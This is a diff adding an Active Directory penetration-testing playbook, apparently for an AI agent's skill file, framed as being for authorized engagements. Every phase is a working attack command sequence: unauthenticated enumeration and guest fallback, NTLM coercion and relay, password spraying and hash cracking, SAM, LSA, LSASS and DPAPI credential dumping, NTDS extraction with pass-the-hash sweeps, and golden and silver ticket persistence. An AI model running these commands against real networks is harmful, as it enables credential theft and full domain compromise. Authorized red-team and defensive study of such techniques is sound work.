@@ -32,6 +32,185 @@ metadata:
 | Responder | LLMNR/NBT-NS poisoning |
 | Kerbrute | User enumeration & password spray |
 
+## Engagement Spine — Default Playbook (run in order, not just on-demand)
+
+Every authorized internal AD engagement should walk these phases. Each step has a "must-run" check and a callout for the easy-to-miss anti-patterns we've burned ourselves on in past engagements.
+
+### Phase 0 — Unauthenticated recon (no creds yet)
+
+```bash
+# Live-host discovery
+nmap -sn <subnet> -oA hosts
+nxc smb <subnet>                              # SMB banner sweep, signing posture, NetBIOS names
+
+# LDAP signing + channel binding posture (relay-target detection)
+nxc ldap <subnet>                             # banner shows signing:None and channel binding state
+
+# Anonymous SMB + RID brute + password policy disclosure
+nxc smb <subnet> -u '' -p '' --shares
+nxc smb <dc-ip> -u '' -p '' --pass-pol
+nxc smb <dc-ip> -u '' -p '' --rid-brute 10000
+
+# Guest fallback (Critical anti-pattern — often forgotten)
+nxc smb <subnet> -u guest -p ''               # Per-host: success here = F08-class Guest fallback
+nxc smb <dc-ip> -u guest -p '' --rid-brute 10000   # Guest can enumerate users when fallback is on
+
+# Kerberos user-enum (no preauth → no logon noise)
+kerbrute userenum -d <domain> --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
+```
+
+> **Always test `guest`/`''` even when the host appears hardened — the F08 Guest-fallback pattern means any unknown username returns a Guest session in many CTF labs and some real AD environments.**
+
+### Phase 1 — First foothold
+
+```bash
+# Coercion + relay (if SMB signing or LDAP signing/CB missing)
+nxc smb <relayable> -M coerce_plus -o LISTENER=<attacker-ip>
+ntlmrelayx.py -tf relay_targets.txt -smb2support --delegate-access
+ntlmrelayx.py -t ldap://<dc> --escalate-user <domain-user>     # Add user to DA via ACL write
+
+# AS-REP / Kerberoast / lockout-aware spray
+nxc ldap <dc> -u '' -p '' --asreproast asrep.txt               # Public, no auth required if anonymous bind ok
+hashcat -m 18200 asrep.txt rockyou.txt
+nxc smb <subnet> -u users.txt -p 'Season<year>!' --no-bruteforce --jitter 2-5 --continue-on-success
+
+# Anonymous share looting
+nxc smb <subnet> -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
+nxc smb <subnet> -u guest -p '' -M spider_plus -o DOWNLOAD_FLAG=true
+```
+
+### Phase 2 — Authenticated enumeration (single domain user in hand)
+
+Always run all of these in parallel the moment any cred lands. The "first auth move" includes LAPS — over-delegated LAPS read on a standard user is a recurring finding.
+
+```bash
+USER=<user>; PW='<pw>'; DC=<dc-ip>; DOMAIN=<domain.local>
+
+# 1) LAPS read — does this user have ms-Mcs-AdmPwd on any computer? (over-delegation finding)
+nxc ldap $DC -u $USER -p "$PW" -M laps
+
+# 2) BloodHound full collection
+bloodhound-python -u $USER -p "$PW" -d $DOMAIN -ns $DC -c All --zip
+
+# 3) Kerberoast + AS-REP roast (authenticated)
+nxc ldap $DC -u $USER -p "$PW" --kerberoasting kerb.txt
+nxc ldap $DC -u $USER -p "$PW" --asreproast asrep.txt
+
+# 4) ADCS template audit — ESC1-15 detection
+certipy-ad find -u $USER@$DOMAIN -p "$PW" -dc-ip $DC -vulnerable -enabled -stdout
+# If LDAPS broken (DC has no cert), Certipy auto-falls-back to LDAP — check that the bind succeeded
+
+# 5) Share spider with creds
+nxc smb <subnet> -u $USER -p "$PW" -M spider_plus -o DOWNLOAD_FLAG=true
+
+# 6) User-description harvest (admins leak hints there)
+nxc ldap $DC -u $USER -p "$PW" --user-desc
+
+# 7) Delegation audit (RBCD / unconstrained / constrained)
+nxc ldap $DC -u $USER -p "$PW" --find-delegation --trusted-for-delegation
+```
+
+### Phase 3 — First local admin obtained
+
+Whenever you `(Pwn3d!)` any host — even before pursuing domain rights — sweep credential stores in this exact order:
+
+```bash
+HOST=<ip>; CRED='-u <user> -p <pw>'   # add --local-auth if local SAM compromise
+
+# 1) SAM hashes — for pass-the-hash sweep
+nxc smb $HOST $CRED --sam
+
+# 2) LSA secrets — cleartext domain credentials cached on member servers
+nxc smb $HOST $CRED --lsa
+
+# 3) LSASS scrape — fresh Kerberos tickets + cleartext from logged-in users
+nxc smb $HOST $CRED -M lsassy
+
+# 4) DPAPI — saved RDP creds, browser passwords, vault entries
+nxc smb $HOST $CRED --dpapi nosystem
+
+# 5) Profile-dir hunt — interactive users leave artifacts (ConsoleHost_history, Desktop notes)
+nxc smb $HOST $CRED -x 'cmd.exe /c dir C:\Users'
+# For each interesting profile:
+nxc smb $HOST $CRED -x 'cmd.exe /c type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
+```
+
+> **DPAPI vault decryption is one of the most under-used pivots.** From local admin, the user's DPAPI master keys + DPAPI machine key + the user's password (or the LSA-cached version) decrypts every saved credential blob — saved RDP creds in particular often yield a second domain account. We caught the F13 lapsus pivot exactly this way.
+
+### Phase 4 — Domain admin obtained
+
+The moment you reach DA (or any DCSync-capable identity), execute the credential-validation sweep:
+
+```bash
+DC=<ip>; CRED='-u <da-user> -p <pw>'
+
+# 1) Dump NTDS to ~/.nxc/logs/ntds/<HOST>_<IP>_<TS>.ntds
+nxc smb $DC $CRED --ntds
+
+# 2) Extract paired user/hash lists (skip disabled + machine accts)
+NTDS=$(ls -t ~/.nxc/logs/ntds/*.ntds | head -1)
+grep -vi disabled "$NTDS" | awk -F: '$1 !~ /\$$/ {print $1":"$4}' > /tmp/pairs.txt
+cut -d: -f1 /tmp/pairs.txt > /tmp/users.txt
+cut -d: -f2 /tmp/pairs.txt > /tmp/hashes.txt
+
+# 3) Paired PtH spray — maps where each cred is local admin domain-wide
+nxc smb <subnet> -u /tmp/users.txt -H /tmp/hashes.txt --no-bruteforce --continue-on-success
+nxc smb <subnet> -u /tmp/users.txt -H /tmp/hashes.txt --no-bruteforce --continue-on-success --local-auth
+
+# 4) Cross-forest hash collision audit (if a second forest is in scope)
+# Use skills/scripts/ntds_diff.py — see "Cross-forest password reuse" section below
+```
+
+### Phase 5 — Cross-forest opportunism
+
+If two or more forests are in scope, **always diff their NTDS dumps** for NT-hash collisions. Same-hash pairs across forests = same plaintext password = single credential pivot between unrelated identity domains, even without a forest trust.
+
+```bash
+# After DCSync of both forests:
+python3 skills/scripts/ntds_diff.py /tmp/forestA.ntds /tmp/forestB.ntds
+```
+
+Cross-forest collisions are routinely missed because operators don't think to compare NTDS dumps; they treat each forest as its own engagement. The Lehack2024 engagement found 4 in-scope cross-forest pairs (jesse↔jesse for DA, plus three regular-user pairs), all from operators applying the same passwords twice during two-forest provisioning.
+
+### Phase 5.5 — Kerberos auth without /etc/hosts or system NTP
+
+When the engagement Kali has no passwordless sudo (common on shared lab boxes) and the AD realm doesn't resolve via DNS, normal `nxc -k --use-kcache` fails with `[Errno -2] Name or service not known` on the `<REALM>:88` lookup. When the DC is also clock-skewed, Kerberos AS-REQ fails with `KRB_AP_ERR_SKEW`. Use `skills/scripts/nxc_kerberos_wrapper.py` — it injects a `socket.getaddrinfo` shim and a `datetime` offset before exec'ing nxc, so every nxc Kerberos flag Just Works:
+
+```bash
+# 1. Mint TGT (NT hash via -hashes, AES key via -aesKey for Protected Users members)
+impacket-getTGT <realm>/<user> -aesKey <aes256-from-ntds> -dc-ip <dc-ip>
+
+# 2. Configure the wrapper for this realm
+export NXC_HOSTS='armorique.local=10.3.10.13,village.armorique.local=10.3.10.13,village=10.3.10.13'
+export NXC_OFFSET=-10800   # Kali is 3h ahead of DC
+export KRB5CCNAME=$PWD/<user>.ccache
+
+# 3. Use nxc as normal — every flag works
+python3 skills/scripts/nxc_kerberos_wrapper.py smb village.armorique.local -k --use-kcache --shares --users --pass-pol
+python3 skills/scripts/nxc_kerberos_wrapper.py ldap village.armorique.local -k --use-kcache --kerberoasting roast.txt
+```
+
+> **Protected Users members can only auth with AES.** When the target user is in Protected Users, NTLM returns `STATUS_ACCOUNT_RESTRICTION` and RC4 Kerberos returns `KDC_ERR_ETYPE_NOSUPP`. Pass `-aesKey <AES256-from-NTDS>` to `impacket-getTGT` — the NT hash won't work.
+
+> **Protected Users blocks S4U2Proxy.** Even when a Protected Users member has `TRUSTED_TO_AUTH_FOR_DELEGATION` and `msDS-AllowedToDelegateTo` configured, their TGT is non-forwardable by design — `KDC_ERR_BADOPTION` ("initial TGT not forwardable") on the S4U2Proxy step. This is a common defense-in-depth configuration that *neutralizes* the delegation without removing the bad config; report the misconfiguration anyway as a hygiene finding.
+
+### Phase 6 — Persistence demo (with explicit operator approval)
+
+```bash
+# Golden ticket (krbtgt hash + domain SID)
+impacket-ticketer -nthash <krbtgt-nt> -domain-sid <sid> -domain <domain> Administrator
+
+# Silver ticket (machine-account hash + SPN)
+impacket-ticketer -nthash <machine-nt> -domain-sid <sid> -domain <domain> -spn cifs/<host>.<domain> Administrator
+
+# AdminSDHolder ACL backdoor (creates persistent DA-equivalent path)
+# See "Persistence Mechanisms" below for the full syntax
+```
+
+> **OPSEC reminder:** Golden tickets, AdminSDHolder, and DSRM persistence must be documented in the engagement report so the defender can clean up. Never leave persistence artifacts unannounced.
+
+---
+
 ## Core Workflow
 
 ### Step 1: Kerberos Clock Sync
